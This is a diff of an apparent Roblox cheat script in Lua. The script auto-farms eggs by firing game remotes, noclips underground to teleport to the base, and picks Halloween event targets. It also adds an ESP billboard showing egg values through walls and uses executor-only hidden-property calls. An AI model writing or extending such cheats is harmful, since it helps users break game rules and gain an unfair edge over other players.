 local function groundPos(pos)
@@ -603,7 +931,7 @@ local function dodge()
     local target = groundPos(hrp.Position + away * 120)
     moveTo(CFrame.new(target), abortFarm)
     local t0 = os.clock()
-    while Alive and S.Farm and os.clock() - t0 < 6 do
+    while Alive and S.Run and os.clock() - t0 < 6 do
         if not guardThreat() then break end
         task.wait(0.2)
     end
@@ -637,7 +965,7 @@ local function swingAt(egg)
     local swing = RS:FindFirstChild("MasteryPickaxeSwing")
     if swing then swing:FireServer() end
     task.delay(CFG.RetrasoGolpe, function()
-        if not Alive or not S.Farm then return end
+        if not Alive or not S.Run then return end
         if not eggLive(egg) or not pickaxeInHand() then return end
         S.HitId = S.HitId + 1
         req:FireServer(egg, S.HitId)
@@ -652,8 +980,10 @@ local function breakEgg(egg)
     local startT = os.clock()
     local lastHp = tonumber(egg:GetAttribute("Health"))
     local lastDrop = os.clock()
+    local lastFix = os.clock()
+    local fixN = 0
 
-    while Alive and S.Farm and not isDead() do
+    while Alive and S.Run and not isDead() do
         if dodge() then return "switch" end
         if not egg.Parent then return "gone" end
         if not eggLive(egg) then return "dead" end
@@ -666,14 +996,16 @@ local function breakEgg(egg)
         if type(hp) == "number" and (lastHp == nil or hp < lastHp) then
             lastHp, lastDrop = hp, now
         end
-        if now - lastDrop > CFG.SinDano or now - startT > CFG.MaxPorHuevo then
+        local limDano = S.Evento and 90 or CFG.SinDano
+        local limTotal = S.Evento and 900 or CFG.MaxPorHuevo
+        if now - lastDrop > limDano or now - startT > limTotal then
             Black[egg] = now + CFG.VetoHuevo
             ST.Vetados = ST.Vetados + 1
             if S.Selected == egg then
                 S.Selected = nil
                 selectAuto()
             end
-            notify("Huevo sin progreso: lo salto un rato", "triangle-alert")
+            notify("n_noprog", "triangle-alert")
             return "switch"
         end
 
@@ -685,23 +1017,18 @@ local function breakEgg(egg)
             winHp, winT = hp, now
         end
 
-        if not S.Selected and S.Dps > 0 and now - lastCheck >= 2 and type(hp) == "number" then
-            lastCheck = now
-            if hp / S.Dps > S.MaxEta then
-                local alt = desiredEgg()
-                if alt and alt ~= egg then
-                    local altHp = tonumber(alt:GetAttribute("Health")) or 0
-                    if altHp < hp then return "switch" end
-                end
-            end
-        end
-
         if eggZone(egg) > allowedMaxZone() then return "switch" end
 
         local hrp = getHRP()
         if hrp and surfDist(egg, hrp.Position) > 6.5 then
             if not moveTo(standCF(egg), abortFarm) then return "gone" end
             lastDrop = os.clock()
+            lastFix = lastDrop
+        elseif now - lastDrop > 5 and now - lastFix > 5 then
+            lastFix = now
+            fixN = fixN + 1
+            S.Estado = "Reposicionando..."
+            if not moveTo(standCF(egg, math.rad(65 * fixN)), abortFarm) then return "gone" end
         end
         if not pickaxeInHand() then equipPickaxe() end
 
@@ -797,7 +1124,7 @@ end
 local function grab(pickup)
     local t0 = os.clock()
     local tries = 0
-    while Alive and S.Farm and not isDead() and os.clock() - t0 < CFG.EsperaGrab do
+    while Alive and S.Run and not isDead() and os.clock() - t0 < CFG.EsperaGrab do
         if carrying() then return true end
         if not pickup.Parent then break end
         if not S.Carried and dodge() then t0 = os.clock() end
@@ -859,20 +1186,44 @@ local function baseCF()
     return nil
 end
 
+local function lobbyCF()
+    local build = Workspace:FindFirstChild("Build")
+    local folder = build and build:FindFirstChild("ZoneHitboxes")
+    local sz = folder and folder:FindFirstChild("SafeZone")
+    if not (sz and sz:IsA("BasePart")) then return nil end
+    local base = baseCF()
+    local y = base and base.Position.Y or (sz.Position.Y - sz.Size.Y / 2 + 4)
+    return CFrame.new(sz.Position.X, y, sz.Position.Z)
+end
+
+local function waitDeposit(t)
+    local t0 = os.clock()
+    while Alive and S.Run and carrying() and os.clock() - t0 < t do
+        task.wait(0.1)
+    end
+    return not carrying()
+end
+
 local function deliver()
     local cf = baseCF()
     if not cf then
-        notify("No encontre tu base", "triangle-alert")
+        notify("n_nobase", "triangle-alert")
         S.Estado = "No encontre tu base"
         return false
     end
-    for _ = 1, 3 do
-        if not (Alive and S.Farm) or isDead() then break end
+    for try = 1, 3 do
+        if not (Alive and S.Run) or isDead() then break end
         if not carrying() then return false end
+        local lobby = try == 1 and lobbyCF() or nil
+        if lobby then
+            S.Estado = "Yendo al centro del lobby..."
+            if not moveTo(lobby, abortCarry) then return false end
+            if waitDeposit(1.5) then return true end
+        end
         S.Estado = "Llevando el animal a tu base..."
         if not moveTo(cf, abortCarry) then return false end
         local t0 = os.clock()
-        while Alive and S.Farm and carrying() and os.clock() - t0 < CFG.EsperaBanco do
+        while Alive and S.Run and carrying() and os.clock() - t0 < CFG.EsperaBanco do
             task.wait(0.1)
         end
         if not carrying() then return true end
@@ -906,16 +1257,7 @@ do
         return nil
     end
 
-    local function noclip(char, saved)
-        for _, p in ipairs(char:GetDescendants()) do
-            if p:IsA("BasePart") then
-                if saved[p] == nil then saved[p] = p.CanCollide end
-                if p.CanCollide then p.CanCollide = false end
-            end
-        end
-    end
-
-    function Sub.under(cf, abort)
+    local function underBody(cf, abort, gen)
         local char, hrp = getChar(), getHRP()
         if not char or not hrp then return false end
 
@@ -924,24 +1266,22 @@ do
         local p0 = hrp.Position
         local params = makeParams()
         local lastFy = floorY(params, p0.X, p0.Y + 4, p0.Z) or (p0.Y - 3)
-        local saved = {}
-        noclip(char, saved)
+        Move.noclip(char)
 
         local ok, arrived = true, false
         local x, z, curY = p0.X, p0.Z, p0.Y
         local scanAt = os.clock() + 0.3
 
-        local function enforce()
-            for p in pairs(saved) do
-                if p.Parent and p.CanCollide then p.CanCollide = false end
-            end
+        local function stop()
+            return not Alive or S.Gen ~= gen or (abort and abort())
         end
         local function frame()
             local dt = math.min(RunService.Heartbeat:Wait(), 0.05)
+            Move.T = os.clock()
             if os.clock() >= scanAt then
                 scanAt = os.clock() + 0.3
                 local c = getChar()
-                if c then noclip(c, saved) end
+                if c then Move.noclip(c) end
             end
             return dt
         end
@@ -954,12 +1294,12 @@ do
         S.Estado = "Farm 2: bajando bajo tierra..."
         local downY = lastFy - depth
         while ok and curY > downY + 0.05 do
-            if not Alive or (abort and abort()) then ok = false break end
+            if stop() then ok = false break end
             local h = getHRP()
             if not h then ok = false break end
             local dt = frame()
             curY = math.max(curY - CFG.VelBajar * dt, downY)
-            enforce()
+            Move.enforce()
             put(h, x, curY, z, ZERO)
         end
 
@@ -974,7 +1314,7 @@ do
             local traveled = 0
             S.Estado = "Farm 2: viajando bajo tierra a tu base..."
             while traveled < dist do
-                if not Alive or (abort and abort()) then ok = false break end
+                if stop() then ok = false break end
                 if not carryingNow() then break end
                 local h = getHRP()
                 if not h then ok = false break end
@@ -984,7 +1324,7 @@ do
                 local f = floorY(params, x, math.max(lastFy, curY) + 5, z)
                 if f then lastFy = f end
                 curY = curY + ((lastFy - depth) - curY) * math.min(1, dt * 14)
-                enforce()
+                Move.enforce()
                 put(h, x, curY, z, vel)
             end
             arrived = ok and traveled >= dist
@@ -1001,12 +1341,12 @@ do
         end
         S.Estado = "Farm 2: subiendo a la zona segura..."
         while ok and curY < upY - 0.05 do
-            if not Alive or (abort and abort()) then ok = false break end
+            if stop() then ok = false break end
             local h = getHRP()
             if not h then ok = false break end
             local dt = frame()
             curY = math.min(curY + CFG.VelBajar * dt, upY)
-            enforce()
+            Move.enforce()
             put(h, x, curY, z, ZERO)
         end
 
@@ -1020,26 +1360,42 @@ do
             h.AssemblyLinearVelocity = ZERO
             h.AssemblyAngularVelocity = ZERO
         end
-        for p, v in pairs(saved) do
-            if p.Parent then p.CanCollide = v end
-        end
         return ok, arrived
+    end
+
+    function Sub.under(cf, abort)
+        Move.N = Move.N + 1
+        Move.T = os.clock()
+        local r1, r2 = false, false
+        local okc, a, b = pcall(underBody, cf, abort, S.Gen)
+        if okc then r1, r2 = a, b end
+        Move.N = math.max(Move.N - 1, 0)
+        if Move.N == 0 then pcall(Move.release, true) end
+        return r1, r2
     end
 
     function Sub.deliverUnder()
         local cf = baseCF()
         if not cf then
-            notify("No encontre tu base", "triangle-alert")
+            notify("n_nobase", "triangle-alert")
             S.Estado = "No encontre tu base"
             return false
         end
         if not carrying() then return true end
+
+        local lobby = lobbyCF()
+        if lobby then
+            local okL, arrL = Sub.under(lobby, abortFarm)
+            if not okL then return false end
+            if arrL and waitDeposit(1.5) then return true end
+        end
+
         local okU, arrivedU = Sub.under(cf, abortFarm)
         if not okU or not arrivedU then return false end
 
         S.Estado = "Farm 2: dejando el animal..."
         local t0 = os.clock()
-        while Alive and S.Farm and carrying() and os.clock() - t0 < CFG.EsperaBanco do
+        while Alive and S.Run and carrying() and os.clock() - t0 < CFG.EsperaBanco do
             task.wait(0.1)
         end
         if not carrying() then return true end
@@ -1065,6 +1421,27 @@ do
         return ok
     end
 end
+task.spawn(function()
+    while Alive do
+        task.wait(0.3)
+        if Move.N > 0 and os.clock() - Move.T > 1.5 then Move.N = 0 end
+        if Move.N == 0 then
+            pcall(function()
+                if next(Move.CC) then Move.release(false) end
+                if S.Run and not isDead() and os.clock() >= S.HoldHasta and LP:GetAttribute("Jailed") ~= true then
+                    local c, hum, hrp = getChar(), getHum(), getHRP()
+                    if hum and hum.PlatformStand and not (c and c:GetAttribute("Ragdolled")) then
+                        hum.PlatformStand = false
+                    end
+                    if hrp then
+                        if hrp.Anchored then hrp.Anchored = false end
+                        if not hrp.CanCollide then hrp.CanCollide = true end
+                    end
+                end
+            end)
+        end
+    end
+end)
 
 local function inForbiddenZone()
     local hrp = getHRP()
@@ -1074,13 +1451,212 @@ local function inForbiddenZone()
 end
 
 local function escapeToBase()
-    local cf = baseCF()
+    local cf = lobbyCF() or baseCF()
     if not cf then return end
-    notify("Zona sin poder suficiente: volviendo a la base", "shield")
+    notify("n_zone", "shield")
     S.Busy = true
     S.Estado = "Saliendo de zona peligrosa..."
     moveTo(cf, abortFarm)
     S.Busy = false
+end
+
+local eventPick
+
+local EV_PRIO = { titanic = 1, lucky = 2, phantom = 3, door = 4, pile = 4 }
+local EvState = { Idle = os.clock(), Stream = 0, TitanicId = nil, TitanicDone = false, TIdle = nil, Ran = false }
+local HallowCache = { Raw = nil, Data = {} }
+
+local function hallowActive()
+    local now = Workspace:GetServerTimeNow()
+    local raw = Workspace:GetAttribute("HalloweenScheduleState")
+    if raw ~= HallowCache.Raw then
+        HallowCache.Raw = raw
+        HallowCache.Data = {}
+        if type(raw) == "string" and raw ~= "" then
+            local ok, st = pcall(HttpService.JSONDecode, HttpService, raw)
+            if ok and type(st) == "table" and type(st.Active) == "table" then
+                for _, a in ipairs(st.Active) do
+                    if type(a) == "table" and a.Key and tonumber(a.EndsAt) then
+                        HallowCache.Data[a.Key] = tonumber(a.EndsAt)
+                    end
+                end
+            end
+        end
+    end
+    local act = {}
+    for k, e in pairs(HallowCache.Data) do
+        if e > now then act[k] = e end
+    end
+    if Workspace:GetAttribute("BloodMoonActive") == true and not act.BloodMoon then
+        act.BloodMoon = now + 30
+    end
+    return act
+end
+
+local function titanicActive()
+    local ends = tonumber(Workspace:GetAttribute("TitanicEndsAt"))
+    return ends ~= nil and ends > Workspace:GetServerTimeNow()
+end
+
+local function phantomValid(p)
+    if p:GetAttribute("DisguisedEggRun") == nil then return false end
+    local e = tonumber(p:GetAttribute("DisguisedEggEndsAt"))
+    return e == nil or e > Workspace:GetServerTimeNow()
+end
+
+local function eventTargets()
+    local hrp = getHRP()
+    local pos = hrp and hrp.Position
+    local safe = safeMaxZone()
+    local now = os.clock()
+    local list = {}
+
+    local function add(p, kind)
+        if (Black[p] or 0) >= now then return end
+        local z = eggZone(p)
+        if z < 1 or z > safe then return end
+        if guardActiveNear(p.Position, 80) then return end
+        if kind == "door" or kind == "pile" then
+            local hp = tonumber(p:GetAttribute("Health")) or 0
+            if S.Dps > 0 and hp / S.Dps > 150 then return end
+        end
+        list[#list + 1] = {
+            part = p,
+            kind = kind,
+            prio = EV_PRIO[kind],
+            dist = pos and (p.Position - pos).Magnitude or 0,
+        }
+    end
+
+    for _, p in ipairs(CollectionService:GetTagged("BreakableEgg")) do
+        if p:IsA("BasePart") and eggLive(p) then
+            if p:GetAttribute("Titanic") == true then
+                add(p, "titanic")
+            elseif CollectionService:HasTag(p, "LuckyEgg") or p:GetAttribute("Lucky") == true then
+                add(p, "lucky")
+            elseif phantomValid(p) then
+                add(p, "phantom")
+            end
+        end
+    end
+    for _, p in ipairs(CollectionService:GetTagged("BreakableHalloweenDoor")) do
+        if p:IsA("BasePart") and eggLive(p) then add(p, "door") end
+    end
+    for _, p in ipairs(CollectionService:GetTagged("BreakableCandyPile")) do
+        if p:IsA("BasePart") and eggLive(p) then add(p, "pile") end
+    end
+
+    table.sort(list, function(a, b)
+        if a.prio ~= b.prio then return a.prio < b.prio end
+        return a.dist < b.dist
+    end)
+    return list
+end
+
+local function zoneCenter(i)
+    local build = Workspace:FindFirstChild("Build")
+    local folder = build and build:FindFirstChild("ZoneHitboxes")
+    local p = folder and folder:FindFirstChild(tostring(i))
+    if p and p:IsA("BasePart") then return p.Position end
+    return nil
+end
+
+local function bagAmount()
+    return tonumber(LP:GetAttribute("CandyHeistBag")) or 0
+end
+
+local function bankCandy()
+    local cf = lobbyCF() or baseCF()
+    if not cf then return end
+    S.Busy = true
+    S.Estado = "Evento: guardando caramelos..."
+    moveTo(cf, abortFarm)
+    local t0 = os.clock()
+    while Alive and S.Run and bagAmount() > 0 and os.clock() - t0 < 5 do
+        task.wait(0.2)
+    end
+    S.Busy = false
+end
+
+local function eventFinish(key)
+    S.EvFinish = os.clock() + 1.5
+    S.Evento = false
+    runUpdate()
+    S.Busy = false
+    S.Estado = "Evento terminado"
+    if EventToggle then
+        pcall(function() EventToggle:Unlock() end)
+        pcall(function() EventToggle:Set(false) end)
+    end
+    notify(key, "info")
+end
+
+eventPick = function()
+    if not S.Evento then return nil end
+
+    local act = hallowActive()
+    local targets = eventTargets()
+    local bag = bagAmount()
+
+    if bag >= 450 or (bag > 0 and (#targets == 0 or next(act) == nil)) then
+        bankCandy()
+        return nil
+    end
+
+    if #targets > 0 then
+        EvState.Idle = os.clock()
+        EvState.Ran = true
+        S.EvKind = targets[1].kind
+        return targets[1].part
+    end
+
+    local tActive = titanicActive()
+    local sid = Workspace:GetAttribute("TitanicSpawnId")
+    if sid ~= EvState.TitanicId then
+        EvState.TitanicId = sid
+        EvState.TitanicDone = false
+        EvState.TIdle = nil
+    end
+
+    if tActive and not EvState.TitanicDone then
+        local tz = tonumber(Workspace:GetAttribute("TitanicZoneIndex"))
+        if not tz then
+            EvState.TitanicDone = true
+        elseif tz > safeMaxZone() then
+            EvState.TitanicDone = true
+            notify("n_titanic", "triangle-alert")
+        else
+            local pos = zoneCenter(tz)
+            local hrp = getHRP()
+            if pos and hrp and flatDist(hrp.Position, pos) > 120 then
+                S.Estado = "Evento: corriendo a la zona " .. tz
+                if os.clock() - EvState.Stream > 3 then
+                    EvState.Stream = os.clock()
+                    pcall(function() LP:RequestStreamAroundAsync(pos, 3) end)
+                end
+                moveTo(CFrame.new(groundPos(pos)), abortFarm)
+                EvState.TIdle = nil
+                return nil
+            end
+            EvState.TIdle = EvState.TIdle or os.clock()
+            if os.clock() - EvState.TIdle > 14 then
+                EvState.TitanicDone = true
+            end
+        end
+    end
+
+    local anyActive = next(act) ~= nil or (tActive and not EvState.TitanicDone)
+    if anyActive then
+        S.Estado = "Evento: esperando objetivos..."
+        EvState.Idle = os.clock()
+        return nil
+    end
+
+    S.Estado = "Evento: buscando..."
+    if os.clock() - EvState.Idle > 6 then
+        eventFinish(EvState.Ran and "n_evend" or "n_noev")
+    end
+    return nil
 end
 
 local function farmCycle()
@@ -1124,7 +1700,7 @@ local function farmCycle()
         S.Estado = "Recuperando el animal..."
         local pickup
         local t0 = os.clock()
-        while Alive and S.Farm and not isDead() and not holding() and os.clock() - t0 < 6 do
+        while Alive and S.Run and not isDead() and not holding() and os.clock() - t0 < 6 do
             local h = getHRP()
             pickup = h and findPickup(nil, h.Position, true)
             if pickup then break end
@@ -1148,14 +1724,25 @@ local function farmCycle()
 
     if dodge() then return end
 
-    local egg = desiredEgg()
-    if not egg then
-        S.Estado = "No hay huevos en zonas seguras"
-        task.wait(0.6)
-        return
+    local egg
+    if S.Evento then
+        egg = eventPick()
+        S.Target = egg
+        if not egg then
+            task.wait(0.3)
+            return
+        end
+    else
+        egg = desiredEgg()
+        S.Target = egg
+        if not egg then
+            S.Estado = "No hay huevos en zonas seguras"
+            task.wait(0.6)
+            return
+        end
     end
     if not equipPickaxe() then
-        notify("No tienes el pico", "triangle-alert")
+        notify("n_pick", "triangle-alert")
         S.Estado = "No tienes el pico"
         task.wait(1)
         return
@@ -1167,10 +1754,19 @@ local function farmCycle()
 
     S.Estado = "Rompiendo huevo..."
     local result = breakEgg(egg)
-    if result == "switch" or not S.Farm then return end
+    if result == "switch" or not S.Run then return end
+
+    if S.Evento and (S.EvKind == "door" or S.EvKind == "pile") then
+        local tw = os.clock()
+        local lim = S.EvKind == "door" and 4 or 2.2
+        while Alive and S.Run and os.clock() - tw < lim do
+            task.wait(0.1)
+        end
+        return
+    end
 
     local t0 = os.clock()
-    while Alive and S.Farm and os.clock() - t0 < 3 do
+    while Alive and S.Run and os.clock() - t0 < 3 do
         if egg:GetAttribute("Hatching") or egg:GetAttribute("HatchId") ~= nil or not egg.Parent then break end
         task.wait(0.05)
     end
@@ -1182,7 +1778,7 @@ local function farmCycle()
     S.Estado = "Esperando que salga el animal..."
     local pickup
     t0 = os.clock()
-    while Alive and S.Farm and not isDead() and os.clock() - t0 < CFG.EsperaPickup do
+    while Alive and S.Run and not isDead() and os.clock() - t0 < ((S.Evento and S.EvKind == "phantom") and 6 or CFG.EsperaPickup) do
         pickup = findPickup(hatchId, epos, os.clock() - t0 > 10)
         if pickup then break end
         dodge()
@@ -1202,14 +1798,14 @@ local function farmCycle()
     else
         ST.Fallos = ST.Fallos + 1
         S.Estado = "No pude agarrar el animal"
-        notify("No pude agarrar el animal", "triangle-alert")
+        notify("n_grab", "triangle-alert")
     end
     S.Busy = false
 end
 
 task.spawn(function()
     while Alive do
-        if S.Farm then
+        if S.Run then
             local ok, err = pcall(farmCycle)
             if not ok then
                 S.Busy = false
@@ -1224,46 +1820,115 @@ task.spawn(function()
 end)
 
 local lastSig = ""
+local SpyPara, SpyList, SpyBill
+local lastSpyKey = ""
+
+local function rarityHex(r)
+    local c = EggRewardsMod and EggRewardsMod.RarityColors and EggRewardsMod.RarityColors[r]
+    if typeof(c) ~= "Color3" then return "#FFFFFF" end
+    return string.format("#%02X%02X%02X", math.floor(c.R * 255 + 0.5), math.floor(c.G * 255 + 0.5), math.floor(c.B * 255 + 0.5))
+end
+
+local function spySet(title, desc)
+    if SpyPara then
+        pcall(function() SpyPara:SetTitle(title) end)
+        pcall(function() SpyPara:SetDesc(desc) end)
+    end
+end
+
+local function spyListSet(title, desc)
+    if SpyList then
+        pcall(function() SpyList:SetTitle(title) end)
+        pcall(function() SpyList:SetDesc(desc) end)
+    end
+end
+
+local function spyBillboard(part, text)
+    if not S.Espiar or not part then
+        if SpyBill then pcall(function() SpyBill.Adornee = nil; SpyBill.Enabled = false end) end
+        return
+    end
+    pcall(function()
+        if not SpyBill then
+            local bb = Instance.new("BillboardGui")
+            bb.Name = "NEXVYRHUB_ESPINFO"
+            bb.AlwaysOnTop = true
+            bb.Size = UDim2.fromOffset(280, 78)
+            bb.ResetOnSpawn = false
+            local lb = Instance.new("TextLabel")
+            lb.Name = "T"
+            lb.BackgroundTransparency = 1
+            lb.Size = UDim2.fromScale(1, 1)
+            lb.RichText = true
+            lb.TextWrapped = true
+            lb.TextSize = 15
+            lb.Font = Enum.Font.GothamBold
+            lb.TextColor3 = Color3.fromRGB(255, 255, 255)
+            lb.TextStrokeTransparency = 0.25
+            lb.Parent = bb
+            bb.Parent = (gethui and gethui()) or CoreGui
+            SpyBill = bb
+        end
+        SpyBill.StudsOffsetWorldSpace = Vector3.new(0, part.Size.Y / 2 + 5, 0)
+        SpyBill.Adornee = part
+        SpyBill.Enabled = true
+        local lb = SpyBill:FindFirstChild("T")
+        if lb and text then lb.Text = text end
+    end)
+end
+
 local function refreshSpy()
-    local list = scanEggs()
-    local values = { AUTO_LABEL }
-    local map = {}
-    local sig = {}
-    local selLabel
-
-    for i = 1, math.min(CFG.Top, #list) do
-        local lb = eggLabel(list[i], i)
-        values[#values + 1] = lb
-        map[lb] = list[i].part
-        sig[#sig + 1] = lb
-        if S.Selected == list[i].part then selLabel = lb end
-    end
-    if S.Selected and not selLabel and eggLive(S.Selected) then
-        local base = eggLabel(eggInfo(S.Selected, nil), 0)
-        local lb = "* " .. string.gsub(base, "^0%. ", "")
-        table.insert(values, 2, lb)
-        map[lb] = S.Selected
-        sig[#sig + 1] = lb
-        selLabel = lb
-    end
-    EggByLabel = map
-
-    local key = table.concat(sig, "|") .. "#" .. tostring(selLabel)
-    if key ~= lastSig and EggDropdown then
-        lastSig = key
-        pcall(function() EggDropdown:Refresh(values) end)
-        pcall(function() EggDropdown:Select(selLabel or AUTO_LABEL) end)
+    local list = scanEggs(true)
+    local hrp = getHRP()
+    local target = S.Target
+    local info
+    if S.Run and target and eggLive(target) then
+        info = eggInfo(target, hrp and hrp.Position)
+    else
+        info = list[1]
     end
 
-    local target = S.Selected
-    if not target or not eggLive(target) then target = list[1] and list[1].part end
-    setHighlight(target)
+    if not info then
+        spySet(tr("no_eggs"), tr("no_eggs_desc"))
+        spyListSet(tr("ranking"), "-")
+        spyBillboard(nil)
+        setHighlight(nil)
+        return
+    end
+
+    local tag = info.bracket ~= "" and (" " .. info.bracket) or ""
+    local eta = (S.Dps > 0) and string.format(" | ~%ds", math.min(math.floor(info.eta), 9999)) or ""
+    local desc = tr("spy_desc",
+        fmt(info.value), fmt(info.best), tostring(info.eggRarity),
+        tostring(info.bestName), tostring(info.bestRarity),
+        info.zone, tag, info.size, fmt(info.kg), eta
+    )
+
+    local lines = {}
+    for i = 1, math.min(5, #list) do
+        lines[#lines + 1] = eggLabel(list[i], i)
+    end
+
+    local key = UI.Lang .. "|" .. info.name .. "|" .. desc .. "|" .. table.concat(lines, ";")
+    if key ~= lastSpyKey then
+        lastSpyKey = key
+        spySet(info.name, desc)
+        spyListSet(tr("ranking"), #lines > 0 and table.concat(lines, "\n") or "-")
+    end
+
+    local bbText = string.format(
+        "%s\n$%s/s | <font color=\"%s\">%s</font>\n%s",
+        info.name, fmt(info.value), rarityHex(info.eggRarity), tostring(info.eggRarity),
+        tr("spy_bill", tostring(info.bestName))
+    )
+    spyBillboard(info.part, bbText)
+    setHighlight(info.part)
 end
 
 task.spawn(function()
     while Alive do
         if S.Espiar then pcall(refreshSpy) end
-        task.wait(1.5)
+        task.wait(1)
     end
 end)
 
@@ -1463,7 +2128,7 @@ end
 task.spawn(function()
     local acc = 0
     while Alive do
-        if S.AntiAfk or S.Farm then
+        if S.AntiAfk or S.Run then
             acc = acc + 1
             if acc >= CFG.AfkCada then
                 acc = 0
@@ -1516,7 +2181,7 @@ do
 
     task.spawn(function()
         while Alive do
-            if S.StreamZonas and (S.Farm or S.IrHuevo) and not isDead() and os.clock() >= blockedUntil then
+            if S.StreamZonas and (S.Run or S.IrHuevo) and not isDead() and os.clock() >= blockedUntil then
                 local ok = pcall(function()
                     readZones()
                     local cap = allowedMaxZone()
@@ -1547,7 +2212,7 @@ end
 do
     task.spawn(function()
         while Alive do
-            if (S.Farm or S.IrHuevo) and not isDead() then
+            if (S.Run or S.IrHuevo) and not isDead() then
                 pcall(function()
                     local hrp = getHRP()
                     local limit = (Workspace.FallenPartsDestroyHeight or -500) + 60
@@ -1556,7 +2221,7 @@ do
                         if cf then
                             hrp.CFrame = cf
                             hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-                            notify("Te caiste del mapa: volviendo a tu base", "shield")
+                            notify("n_fell", "shield")
                         end
                     end
                 end)
@@ -1569,7 +2234,7 @@ end
 do
     task.spawn(function()
         while Alive do
-            if S.Farm then ST.Activo = ST.Activo + 1 end
+            if S.Run then ST.Activo = ST.Activo + 1 end
             task.wait(1)
         end
     end)
@@ -1584,6 +2249,7 @@ local FX = {
     Light     = nil,
     Terrain   = nil,
     Quality   = nil,
+    Deep      = false,
 }
 
 local FX_KIND = {
@@ -1612,7 +2278,9 @@ local FX_TAGS = { "VFX", "EnabledVFX", "ParticleEmitter" }
 
 local function fxApply(inst)
     if inst.Name == "NEXVYRHUB_ESP" then return end
+    if string.sub(inst.Name, 1, 14) == "NEXVYRHUB_LOOK" then return end
     local kind = FX_KIND[inst.ClassName]
+    if not kind and FX.Deep and inst:IsA("Decal") then kind = "texture" end
     local o = FX.Orig[inst]
 
     if kind == "emitter" then
@@ -1644,7 +2312,7 @@ local function fxApply(inst)
             changed = true
         end
         if changed then FX.Orig[inst] = o end
-        if inst.Material ~= Enum.Material.Neon and inst.Material ~= Enum.Material.Plastic then
+        if inst.Material ~= Enum.Material.Plastic and (FX.Deep or inst.Material ~= Enum.Material.Neon) then
             inst.Material = Enum.Material.Plastic
         end
         if inst.CastShadow then inst.CastShadow = false end
@@ -1795,6 +2463,407 @@ task.spawn(function()
     end
 end)
 
+local function fxRefresh()
+    fxSet(S.FpsBoost or S.Rend)
+end
+
+local Rend = {
+    On     = false,
+    Token  = 0,
+    Conns  = {},
+    Hidden = setmetatable({}, { __mode = "k" }),
+    Guis   = setmetatable({}, { __mode = "k" }),
+    Anims  = setmetatable({}, { __mode = "k" }),
+    Hums   = setmetatable({}, { __mode = "k" }),
+    Tech   = nil,
+}
+
+local function topModel(inst)
+    local a = inst
+    while a and a.Parent and a.Parent ~= Workspace do a = a.Parent end
+    return a
+end
+
+local function isOthers(inst)
+    local top = topModel(inst)
+    if not top or top.Parent ~= Workspace then return false end
+    if top.Name == "Plots" then
+        local a = inst
+        while a and a.Parent ~= top do a = a.Parent end
+        return a ~= nil and a:GetAttribute("OwnerUserId") ~= LP.UserId
+    end
+    local pl = Players:GetPlayerFromCharacter(top)
+    return pl ~= nil and pl ~= LP
+end
+
+local function rendApply(inst)
+    if not Rend.On then return end
+    if inst:IsA("BasePart") then
+        if isOthers(inst) then
+            if inst.LocalTransparencyModifier ~= 1 then inst.LocalTransparencyModifier = 1 end
+            Rend.Hidden[inst] = true
+        end
+    elseif inst:IsA("BillboardGui") or inst:IsA("SurfaceGui") then
+        if string.sub(inst.Name, 1, 9) ~= "NEXVYRHUB" and inst.Enabled then
+            Rend.Guis[inst] = true
+            inst.Enabled = false
+        end
+    elseif inst:IsA("Animator") then
+        if isOthers(inst) then
+            Rend.Anims[inst] = true
+            for _, tr in ipairs(inst:GetPlayingAnimationTracks()) do
+                pcall(tr.Stop, tr, 0)
+            end
+        end
+    elseif inst:IsA("Humanoid") then
+        if isOthers(inst) and Rend.Hums[inst] == nil then
+            Rend.Hums[inst] = inst.DisplayDistanceType
+            inst.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+        end
+    end
+end
+
+local function rendHook(inst)
+    pcall(rendApply, inst)
+end
+
+local function rendSweep(token)
+    local t = os.clock()
+    local list = Workspace:GetDescendants()
+    for i = 1, #list do
+        if Rend.Token ~= token or not Rend.On or not Alive then return end
+        pcall(rendApply, list[i])
+        if os.clock() - t > 0.004 then
+            task.wait()
+            t = os.clock()
+        end
+    end
+end
+
+local function rendTech(on)
+    if on then
+        if Rend.Tech == nil and gethiddenproperty and sethiddenproperty then
+            local ok, cur = pcall(gethiddenproperty, Lighting, "Technology")
+            if ok and cur ~= nil then
+                Rend.Tech = cur
+                pcall(sethiddenproperty, Lighting, "Technology", Enum.Technology.Compatibility)
+            end
+        end
+    elseif Rend.Tech ~= nil then
+        pcall(sethiddenproperty, Lighting, "Technology", Rend.Tech)
+        Rend.Tech = nil
+    end
+end
+
+local function rendRestore()
+    for p in pairs(Rend.Hidden) do
+        if p.Parent then pcall(function() p.LocalTransparencyModifier = 0 end) end
+    end
+    Rend.Hidden = setmetatable({}, { __mode = "k" })
+    for g in pairs(Rend.Guis) do
+        if g.Parent then pcall(function() g.Enabled = true end) end
+    end
+    Rend.Guis = setmetatable({}, { __mode = "k" })
+    for h, v in pairs(Rend.Hums) do
+        if h.Parent then pcall(function() h.DisplayDistanceType = v end) end
+    end
+    Rend.Hums = setmetatable({}, { __mode = "k" })
+    Rend.Anims = setmetatable({}, { __mode = "k" })
+end
+
+local function rendSet(on)
+    on = on and true or false
+    if on == Rend.On then return end
+    Rend.On = on
+    Rend.Token = Rend.Token + 1
+    local token = Rend.Token
+    S.Rend = on
+    FX.Deep = on
+
+    if on then
+        local was = FX.On
+        fxRefresh()
+        if was then
+            FX.Token = FX.Token + 1
+            task.spawn(fxSweep, FX.Token)
+        end
+        rendTech(true)
+        Rend.Conns[#Rend.Conns + 1] = Workspace.DescendantAdded:Connect(rendHook)
+        task.spawn(rendSweep, token)
+        task.spawn(function()
+            while Alive and Rend.On and Rend.Token == token do
+                for g in pairs(Rend.Guis) do
+                    if g.Parent and g.Enabled then g.Enabled = false end
+                end
+                for a in pairs(Rend.Anims) do
+                    if a.Parent then
+                        for _, tr in ipairs(a:GetPlayingAnimationTracks()) do
+                            pcall(tr.Stop, tr, 0)
+                        end
+                    end
+                end
+                task.wait(2)
+            end
+        end)
+    else
+        for _, c in ipairs(Rend.Conns) do pcall(function() c:Disconnect() end) end
+        Rend.Conns = {}
+        rendTech(false)
+        rendRestore()
+        if FX.On and S.FpsBoost then
+            for inst, o in pairs(FX.Orig) do
+                if inst and inst.Parent then
+                    if inst:IsA("Decal") and o.Transparency ~= nil then
+                        pcall(function() inst.Transparency = o.Transparency end)
+                    elseif inst:IsA("BasePart") and o.Material == Enum.Material.Neon then
+                        pcall(function() inst.Material = o.Material end)
+                    end
+                end
+            end
+        end
+        fxRefresh()
